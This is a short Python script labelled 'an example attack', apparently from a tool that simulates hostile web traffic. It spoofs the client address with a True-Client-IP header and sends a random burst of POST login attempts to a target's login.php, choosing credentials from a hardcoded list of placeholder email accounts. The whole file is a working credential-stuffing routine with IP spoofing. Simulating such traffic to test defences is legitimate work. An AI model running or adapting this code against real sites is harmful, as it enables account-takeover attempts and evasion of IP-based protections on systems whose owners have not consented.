import requests, random

# an example attack
def enforce_flow(target, source_ip, user_agent, **kwargs):

    # the uri we're going to request
    uri = 'login.php'

    # True-Client-IP needs to be set in order to spoof source ip.
    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip)
              }
   
    creds = [
                {'username': 'admin@gmail.com', 'password': 'abcd1234!'},
                {'username': 'pam.beesly@gmail.com', 'password': 'abcd4321@'},
                {'username': 'peggy.olsen@gmail.com', 'password': 'abcd4321@'},
                {'username': 'leslie.knope@gmail.com', 'password': 'abcd4321@'},
                {'username': 'ellen.ripley@gmail.com', 'password': 'abcd4321@'},
                {'username': 'alfred.lee@gmail.com', 'password': 'abcd4321@'},
                {'username': 'ursula.leguin@gmail.com', 'password': 'abcd4321@'},
                {'username': 'jrr.tolkien@gmail.com', 'password': 'abcd4321@'},
                {'username': 'john.doe@gmail.com', 'password': 'abcd4321@'},
                {'username': 'jane.doe@gmail.com', 'password': 'abcd4321@'},
                {'username': 'real.person@gmail.com', 'password': 'abcd4321@'},
                {'username': 'administrator@gmail.com', 'password': 'abcd4321@'},
                {'username': 'jack.smith@gmail.com', 'password': 'abcd4321@'},
                {'username': 'bruce.wayne@gmail.com', 'password': 'abcd4321@'},
                {'username': 'harry.potter@gmail.com', 'password': 'abcd4321@'}
            ]

    count=random.randint(1,5)
    ret=''

    for i in range(count):

        cred = random.choice(creds)
        
        req = {
                'method': 'POST',
                'url': '{}/{}'.format(target,uri),
                'payload': { 'username': cred['username'], 'password': cred['password']}
                }

        response = requests.request(req['method'], req['url'], headers=headers, data=req['payload']).status_code
        ret += 'enforce_flow: got {} with {}\n'.format(response,req['url'])
    
    return(ret)
